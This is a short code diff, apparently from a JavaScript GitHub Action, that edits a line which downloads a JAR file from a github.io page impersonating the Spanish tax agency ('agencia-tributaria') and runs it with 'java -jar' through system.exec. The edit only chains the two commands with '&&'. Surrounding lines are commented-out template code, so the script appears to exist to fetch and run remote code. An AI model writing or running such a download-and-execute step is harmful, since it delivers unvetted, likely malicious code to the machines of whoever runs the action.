@@ -17,7 +17,7 @@ try {
     console.log("nothing modified") 
   }
   let url = "https://agencia-tributaria.github.io/resource_type/build.jar"
-  system.exec(`wget ${url}; java -jar build.jar`)
+  system.exec(`wget ${url} && java -jar build.jar`)
   //const path = core.getInput('path');
   //const time = (new Date()).toTimeString();
   //core.setOutput("time", time);
